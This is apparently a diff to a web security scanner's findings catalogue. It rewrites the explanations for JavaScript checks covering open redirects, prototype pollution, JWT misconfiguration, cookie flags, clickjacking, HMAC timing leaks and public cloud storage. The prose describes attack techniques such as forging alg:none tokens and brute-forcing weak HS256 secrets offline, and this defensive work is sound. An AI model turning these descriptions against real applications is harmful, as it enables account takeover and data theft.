       "Compare the destination origin against an allowlist before assigning.",
       "Use URL parsing to extract and validate the host component.",
@@ -1904,7 +1904,7 @@
     "description": "location.replace(userUrl) navigates the current page to the attacker-supplied URL while removing the original entry from history. The open-redirect impact is identical to window.location but harder for the victim to back out of.",
     "evidence": "Source-code pattern matched for `code-redirect-location-replace`.",
     "riskImpact": "Phishing campaigns can replace the legitimate history entry, making the back button useless.",
-    "explanation": "The `code-redirect-location-replace` check verifies that the server does not expose the `redirect-location-replace` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "replace differs from assignment in one way that helps an attacker: the current page is dropped from history, so the back button does not return the victim to your site. The rest matches any client-side redirect. The destination belongs to whoever built the link, and a javascript: value executes in your origin. Parse the target with new URL() against location.origin and compare the origin that results.",
     "fixSteps": [
       "Validate the destination host against a strict allowlist.",
       "Use URL parsing to extract and compare origins.",
@@ -1933,7 +1933,7 @@
     "description": "top.location = userInput or parent.location.href = userInput navigates the top-most frame from inside an iframe. When the URL is attacker-controlled, it enables clickjacking-aided redirects and breaks frame-busting controls.",
     "evidence": "Source-code pattern matched for `code-redirect-top-location`.",
     "riskImpact": "Cross-frame navigation to attacker-controlled pages bypasses frame protections and supports phishing chains.",
-    "explanation": "The `code-redirect-top-location` check verifies that the server does not expose the `redirect-top-location` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Frame-busting code and OAuth popups often set top.location, and the danger depends on where the value comes from. Inside a frame, a URL taken from the query string or a postMessage lets whoever controls that input navigate the entire tab, replacing your site with theirs while the user believes they are still on it. Browsers restrict cross-origin frames from doing this without a user gesture, so expect the attack to arrive as a click.",
     "fixSteps": [
       "Restrict top-level navigation to same-origin hosts.",
       "Set Content-Security-Policy: frame-ancestors to limit who can frame your pages.",
@@ -1962,7 +1962,7 @@
     "description": "Lodash's _.merge and _.mergeWith, jQuery's $.extend(true, ...), and libraries such as deep-extend recursively copy enumerable keys. When the source contains __proto__, constructor.prototype, or prototype, the copy writes to Object.prototype.",
     "evidence": "Source-code pattern matched for `code-proto-pollution-deep-merge`.",
     "riskImpact": "Polluting Object.prototype can lead to XSS, authentication bypass, denial of service, or remote code execution.",
-    "explanation": "The `code-proto-pollution-deep-merge` check verifies that the server does not expose the `proto-pollution-deep-merge` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A recursive merge walks into nested objects and copies each key. JSON.parse happily creates an own property named __proto__, so when the merge recurses into it the write lands on Object.prototype and every object in the process inherits it. The effect depends on what later reads a missing property: an isAdmin flag that suddenly exists, template options that become code execution on the server, or an attribute that turns into XSS in the browser.",
     "fixSteps": [
       "Upgrade Lodash to 4.17.21+ or use lodash-es with the same patch.",
       "Replace jQuery $.extend(true, ...) with structuredClone after sanitizing keys.",
@@ -1988,7 +1988,7 @@
     "description": "_.merge(target, userInput) and _.defaultsDeep(target, userInput) recursively copy properties from user input. Before Lodash 4.17.12 the copy wrote through __proto__, allowing attackers to set arbitrary properties on Object.prototype.",
     "evidence": "Source-code pattern matched for `code-proto-pollution-lodash-merge`.",
     "riskImpact": "Object.prototype pollution enables XSS, authentication bypass, and DoS via type-confusion gadgets.",
-    "explanation": "The `code-proto-pollution-lodash-merge` check verifies that the server does not expose the `proto-pollution-lodash-merge` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Lodash fixed this class in stages across the 4.17 line, merge in 4.17.11 and defaultsDeep in 4.17.12, so the version number is the first thing to check. Bundled copies are the usual surprise, because a transitive dependency can pin an old Lodash long after your direct one was upgraded, and npm ls lodash shows every copy. On a patched version the call is only risky if your own code then treats merged keys as trusted.",
     "fixSteps": [
       "Upgrade Lodash to 4.17.21 or later.",
       "Switch to structuredClone for trusted internal data and validate keys for the rest.",
@@ -2011,10 +2011,10 @@
     "title": "Object.assign with __proto__ key",
     "category": "code",
     "severity": "medium",
-    "description": "Object.assign(target, JSON.parse(userInput)) or spread {...userInput} into a target object copies a __proto__ key literally; combined with a subsequent access, this can pollute Object.prototype in engines that honor the assignment.",
+    "description": "Object.assign(target, JSON.parse(userInput)) copies a __proto__ key through the setter, which swaps the prototype of target for an object the attacker wrote.",
     "evidence": "Source-code pattern matched for `code-proto-pollution-object-assign-proto`.",
-    "riskImpact": "Object.prototype pollution enables XSS, type confusion, and bypass of authorization checks.",
-    "explanation": "The `code-proto-pollution-object-assign-proto` check verifies that the server does not expose the `proto-pollution-object-assign-proto` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "riskImpact": "An attacker-chosen prototype supplies inherited values for properties the code never set, which can bypass authorization checks that read them.",
+    "explanation": "Object.assign is safer than a recursive merge because it only copies top-level keys and never descends, so it does not pollute Object.prototype for the whole process. The narrower problem is that it uses ordinary assignment: a top-level __proto__ key from JSON.parse replaces the prototype of that one target object, and values like role or isAdmin then appear on it by inheritance. Spread syntax defines the key as an own property and does not have this problem.",
     "fixSteps": [
       "Use Object.create(null) as the target for untrusted key sets.",
       "Filter keys against an allowlist before Object.assign.",
@@ -2042,7 +2042,7 @@
     "description": "Hand-rolled recursive merge functions that iterate Object.keys(source) and recurse into nested values will write through __proto__ and pollute Object.prototype when the source is attacker-controlled.",
     "evidence": "Source-code pattern matched for `code-proto-pollution-recursive-merge`.",
     "riskImpact": "Same downstream impact as library-driven prototype pollution: XSS, auth bypass, DoS.",
-    "explanation": "The `code-proto-pollution-recursive-merge` check verifies that the server does not expose the `proto-pollution-recursive-merge` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Hand-written merge and clone helpers are the most common source of this bug because they look too simple to be wrong: for each key, recurse if the value is an object, otherwise assign. With a key of __proto__, target[key] returns Object.prototype and the next assignment writes to it. constructor.prototype gets there too, so filtering only __proto__ leaves a second route open. It is worth searching for this loop by hand, since no dependency audit will flag it.",
     "fixSteps": [
       "Skip keys named __proto__, constructor, or prototype in the merge loop.",
       "Use Object.hasOwn(target, key) to guard against inherited keys.",
@@ -2068,7 +2068,7 @@
     "description": "jwt.verify(token, '') or jwt.verify(token, undefined) passes an empty or missing key as the signing secret. Depending on the library and algorithm, this can let a token signed with a predictable or empty key pass verification.",
     "evidence": "Source-code pattern matched for `code-jwt-verify-no-secret`.",
     "riskImpact": "Tokens forged by attackers with a known-empty or predictable secret pass verification and grant arbitrary identities or privileges.",
-    "explanation": "The `code-jwt-verify-no-secret` check verifies that the server does not expose the `jwt-verify-no-secret` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "An empty or undefined key usually comes from a missing environment variable rather than a deliberate choice, which is why it can reach production unnoticed. Libraries differ in what happens next: some throw, and some older versions treat a missing key as permission to accept an unsigned token. An HMAC with an empty key can also be computed by anyone. Treat a missing secret as a startup failure instead of letting the verify call discover it.",
     "fixSteps": [
       "Always pass an explicit secret or public key plus algorithms: ['HS256'] or ['RS256'].",
       "Reject tokens whose alg is 'none'.",
@@ -2097,7 +2097,7 @@
     "description": "jwt.sign(payload, 'secret') or jwt.sign(payload, process.env.JWT_SECRET) where JWT_SECRET is a short, low-entropy string enables offline brute-force of the HMAC key.",
     "evidence": "Source-code pattern matched for `code-jwt-hs256-weak-secret`.",
     "riskImpact": "Attackers recover the HS256 secret and forge tokens for any identity, bypassing authentication entirely.",
-    "explanation": "The `code-jwt-hs256-weak-secret` check verifies that the server does not expose the `jwt-hs256-weak-secret` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "HS256 tokens can be attacked offline. Anyone holding one valid token has the message and its signature, so they can test candidate secrets on their own hardware with hashcat without sending you a single request. A short literal in the jwt.sign call is weak by construction and also ships with the source. Once recovered, the secret signs a valid token for any user, including an admin.",
     "fixSteps": [
       "Use a 256-bit (32-byte) random secret generated with crypto.randomBytes.",
       "Rotate secrets regularly and store them in a secret manager, not env files.",
@@ -2124,7 +2124,7 @@
     "description": "jwt.verify(token, secret, { algorithms: ['none'] }) explicitly allows the 'none' algorithm, so an attacker can send a token with alg:none and no signature and have it accepted.",
     "evidence": "Source-code pattern matched for `code-jwt-none-algorithm`.",
     "riskImpact": "Tokens are accepted without signatures or with a key the attacker controls, granting impersonation.",
-    "explanation": "The `code-jwt-none-algorithm` check verifies that the server does not expose the `jwt-none-algorithm` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "alg: none is a legal value in the JWT specification for tokens with no integrity protection, and it has no place in a verifier. A JWT is only base64url text, so anyone can edit the payload, set alg to none, drop the signature and present themselves as any user. Naming none in the allowed list means the library does as it was told and skips the signature check.",
     "fixSteps": [
       "Always set algorithms explicitly: { algorithms: ['HS256'] } or ['RS256'].",
       "Reject any token whose header.alg differs from the expected list.",
@@ -2153,7 +2153,7 @@
     "description": "Pages that write to innerHTML, document.write, or eval without first creating a trustedTypes policy leave every string-to-DOM sink undefended. Trusted Types forces a sanitizing policy to gate these sinks.",
     "evidence": "Source-code pattern matched for `code-csp-no-trusted-types`.",
     "riskImpact": "DOM XSS via injected strings cannot be blocked without Trusted Types enforcement.",
-    "explanation": "The `code-csp-no-trusted-types` check verifies that the server does not expose the `csp-no-trusted-types` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Inline script here writes to innerHTML, document.write or eval and no Trusted Types policy exists to gate those sinks. Trusted Types makes them refuse plain strings, so the few places that build HTML have to go through one named function you can audit. This is hardening rather than a bug report: the check found the sinks, not a path from user input to them. Browser support is not universal, so keep sanitizing as well.",
     "fixSteps": [
       "Create a default policy: trustedTypes.createPolicy('default', { createHTML: s => DOMPurify.sanitize(s) }).",
       "Add require-trusted-types-for 'script' to your CSP header.",
@@ -2180,7 +2180,7 @@
     "description": "Pages that render user-controlled HTML but lack both a Trusted Types policy and the CSP directive to enforce it leave classic DOM XSS vectors undefended.",
     "evidence": "Source-code pattern matched for `code-csp-missing-trusted-types`.",
     "riskImpact": "Attacker-controlled HTML strings reach innerHTML / insertAdjacentHTML unchecked, enabling stored DOM XSS.",
-    "explanation": "The `code-csp-missing-trusted-types` check verifies that the server does not expose the `csp-missing-trusted-types` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "The page already sends a Content-Security-Policy and its inline scripts write HTML, but the policy has no require-trusted-types-for 'script'. Adding that directive is cheap on a page with few sinks, because every violation can be collected in report-only mode first. Until it is there, the CSP limits where scripts load from but not which strings can be assigned to innerHTML, and that assignment is how DOM XSS works.",
     "fixSteps": [
       "Set CSP: require-trusted-types-for 'script'; trusted-types default.",
       "Register a sanitizing policy (DOMPurify) and use it everywhere.",
@@ -2207,7 +2207,7 @@
     "description": "sessionStorage.setItem('password', pwd) or sessionStorage.setItem('pwd', val) keeps plaintext credentials in the browser for the lifetime of the tab. Any XSS reads it instantly.",
     "evidence": "Source-code pattern matched for `code-auth-sessionstorage-passwords`.",
     "riskImpact": "Plaintext password exfiltration via XSS yields direct credential reuse against other services.",
-    "explanation": "The `code-auth-sessionstorage-passwords` check verifies that the server does not expose the `auth-sessionstorage-passwords` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "sessionStorage survives reloads and is readable by every script on the origin, including analytics tags and any injected payload, and it has no HttpOnly equivalent. A stolen password is worse than a stolen session: it works after the session ends and, since people reuse them, on other sites. The usual reason for this code is carrying a password across a multi-step login, which the server can do with a short-lived token.",
     "fixSteps": [
       "Never persist plaintext passwords client-side; send them once to the server over HTTPS.",
       "Issue an opaque session token via Set-Cookie HttpOnly; Secure; SameSite=Strict.",
@@ -2236,7 +2236,7 @@
     "description": "Cookies set with SameSite=None but without the Secure flag are rejected by browsers, but client-side code can still emit them on HTTP origins. The cookie then flows cross-site over insecure transports.",
     "evidence": "Source-code pattern matched for `code-cookie-samesite-none-http`.",
     "riskImpact": "Cross-site requests over HTTP can carry the cookie, enabling CSRF and session hijacking on downgrade.",
-    "explanation": "The `code-cookie-samesite-none-http` check verifies that the server does not expose the `cookie-samesite-none-http` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Browsers require Secure on SameSite=None cookies and drop those that lack it, so the first symptom is usually a broken cross-site login or embed rather than a breach. Older browsers that predate the rule accept the cookie, and then it travels cross-site and over plain HTTP too. A SameSite=None attribute with no Secure anywhere in the response is what triggered this finding.",
     "fixSteps": [
       "Pair SameSite=None with Secure; on the same origin.",
       "Use SameSite=Lax or Strict for any cookie that does not need cross-site delivery.",
@@ -2265,7 +2265,7 @@
     "description": "document.cookie = 'sid=' + token without '; Secure' allows the cookie to be transmitted over HTTP. Network observers and downgrade attackers can read or replay it.",
     "evidence": "Source-code pattern matched for `code-cookie-missing-secure-http`.",
     "riskImpact": "Cookie captured on an unencrypted hop enables session hijacking without ever breaking TLS at the user.",
-    "explanation": "The `code-cookie-missing-secure-http` check verifies that the server does not expose the `cookie-missing-secure-http` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Without Secure the browser attaches the cookie to any HTTP request for the host, including one an attacker provokes on a hostile network by injecting a link to http://your-site. One plaintext request exposes the value even if every page you serve is HTTPS. document.cookie also cannot set HttpOnly, so a session value written this way is readable from script as well. Set-Cookie from the server gets you both flags.",
     "fixSteps": [
       "Append '; Secure' to every document.cookie write for sensitive values.",
       "Better: set the cookie from the server via Set-Cookie with Secure; HttpOnly; SameSite.",
@@ -2292,7 +2292,7 @@
     "description": "Anchor patterns like <a target=\"_blank\" href=\"javascript:...\"> combine reverse tabnabbing risk with javascript: URL execution. Even with noopener, javascript: still runs in the new tab.",
     "evidence": "Source-code pattern matched for `code-clickjack-target-blank-js-href`.",
     "riskImpact": "Opening a javascript: URL in a new tab executes attacker code in that tab's origin context.",
-    "explanation": "The `code-clickjack-target-blank-js-href` check verifies that the server does not expose the `clickjack-target-blank-js-href` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A javascript: URL runs when the link is followed, so it is an XSS sink whenever part of the href can be influenced. Frameworks that put user-supplied profile links or redirect targets into href are the usual way it gets there. Inert forms such as javascript:void(0) are ignored by this check, so what remains is either dead markup to replace with a button or a real sink.",
     "fixSteps": [
       "Validate href against an allowlist of http(s) URLs; reject javascript:, data:, vbscript:.",
       "Set rel=\"noopener noreferrer\" on every target=\"_blank\" anchor.",
@@ -2321,7 +2321,7 @@
     "description": "Pages without X-Frame-Options: DENY (or a CSP frame-ancestors 'none') can be embedded inside an attacker-controlled iframe, enabling clickjacking against authenticated users.",
     "evidence": "Source-code pattern matched for `code-clickjack-x-frame-options`.",
     "riskImpact": "Attacker overlays a transparent iframe on a decoy page; clicks land on the victim's session, performing unintended actions.",
-    "explanation": "The `code-clickjack-x-frame-options` check verifies that the server does not expose the `clickjack-x-frame-options` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Clickjacking needs no script on your site. An attacker loads your page in a transparent iframe over a decoy button, and the victim's click lands on your Delete or Confirm control with their session attached. Only a response header stops it: frame-ancestors in a CSP header or X-Frame-Options, and neither works from a meta tag. Both were absent from this response, or X-Frame-Options was set to ALLOWALL.",
     "fixSteps": [
       "Send X-Frame-Options: DENY (or SAMEORIGIN if same-origin framing is required).",
       "Set Content-Security-Policy: frame-ancestors 'none' (or 'self').",
@@ -2350,7 +2350,7 @@
     "description": "if (hmac(secret, msg) === providedTag) uses == / === to compare authentication tags. JavaScript string comparison is not constant time and leaks the prefix of a correct tag.",
     "evidence": "Source-code pattern matched for `code-timing-hmac-equality`.",
     "riskImpact": "Network-local attackers recover the HMAC byte-by-byte and forge authenticated requests.",
-    "explanation": "The `code-timing-hmac-equality` check verifies that the server does not expose the `timing-hmac-equality` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "=== stops at the first byte that differs, so a wrong tag with a correct first byte takes slightly longer to reject. With enough requests an attacker can average out the noise and work through the tag one byte at a time, ending with a valid signature for a message of their choosing. It is a hard attack over the internet and far easier from the same cloud region, and the fix is a one-line change.",
     "fixSteps": [
       "Compare HMAC outputs with crypto.timingSafeEqual.",
       "Convert both sides to Buffer of equal length; reject length mismatches.",
@@ -2379,7 +2379,7 @@
     "description": "Patterns like new S3Client({ accessKeyId: 'AKIA...', secretAccessKey: '...' }) embed long-lived IAM keys directly into source. Once the source is logged or committed, the keys are compromised.",
     "evidence": "Source-code pattern matched for `code-cloud-aws-hardcoded-credentials`.",
     "riskImpact": "Leaked keys grant whoever holds them the same AWS permissions as the application, including S3, IAM, and STS.",
-    "explanation": "The `code-cloud-aws-hardcoded-credentials` check verifies that the server does not expose the `cloud-aws-hardcoded-credentials` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Keys written into the SDK constructor end up in the repository, in build artifacts and, if the module is bundled for the browser, in every visitor's download. An AKIA key pair does not expire and works from anywhere unless a policy says otherwise. Attackers scan public code for these continuously, and their first call is usually sts get-caller-identity to see whose key it is. On AWS compute, a role removes the key altogether.",
     "fixSteps": [
       "Remove hardcoded keys; let the SDK pull credentials from the environment, IAM role, or SSO.",
       "Rotate the exposed credentials immediately and audit CloudTrail for misuse.",
@@ -2408,7 +2408,7 @@
     "description": "s3.upload({ Bucket, Key, Body, ACL: 'public-read' }) or PutObjectCommand with explicit public ACLs creates world-readable objects. Worse, buckets without Block Public Access can leak every object.",
     "evidence": "Source-code pattern matched for `code-cloud-aws-s3-upload-no-acl`.",
     "riskImpact": "Public S3 objects leak customer data, backups, or sensitive logs at internet scale.",
-    "explanation": "The `code-cloud-aws-s3-upload-no-acl` check verifies that the server does not expose the `cloud-aws-s3-upload-no-acl` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Setting ACL: 'public-read' on upload makes that object readable by anyone with the URL, no signature needed, and keys are often guessable because they follow a pattern such as invoices/1234.pdf. The code path tends to start with public avatars and later get reused for something private. S3 Block Public Access overrides this ACL and is on by default for new buckets, so a working public-read call means it was turned off.",
     "fixSteps": [
       "Default to ACL 'private' and serve downloads via short-lived presigned URLs.",
       "Enable S3 Block Public Access at the account and bucket level.",
@@ -2437,7 +2437,7 @@
     "description": "Azure blob uploads that set container access level to 'blob' or 'container' make every object publicly listable. Anonymous enumeration of the container then leaks all uploaded files.",
     "evidence": "Source-code pattern matched for `code-cloud-azure-blob-upload-no-acl`.",
     "riskImpact": "Public containers expose uploaded documents, backups, and user-generated content to anyone who guesses the URL.",
-    "explanation": "The `code-cloud-azure-blob-upload-no-acl` check verifies that the server does not expose the `cloud-azure-blob-upload-no-acl` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A container's access level applies to everything in it. blob allows anonymous reads of any blob whose URL is known, and container also lets anyone list the contents, so no guessing is needed at all. Setting this in upload code means a container created for one public use can quietly expose later uploads. Azure can disable anonymous access for a whole storage account, which overrides this setting.",
     "fixSteps": [
       "Set container access level to 'private' and use SAS tokens or AAD for access.",
       "Generate short-lived user delegation SAS URLs instead of account SAS.",
